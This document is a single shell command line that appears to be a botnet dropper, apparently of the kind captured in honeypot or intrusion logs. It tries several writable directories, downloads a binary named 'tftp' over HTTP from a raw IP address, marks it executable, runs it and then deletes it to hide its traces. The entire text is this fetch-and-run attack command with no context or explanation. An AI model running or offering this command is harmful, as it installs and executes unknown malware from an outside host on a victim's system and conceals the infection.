cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.206.225.49/tftp; chmod +x tftp; ./tftp; rm -rf tftp
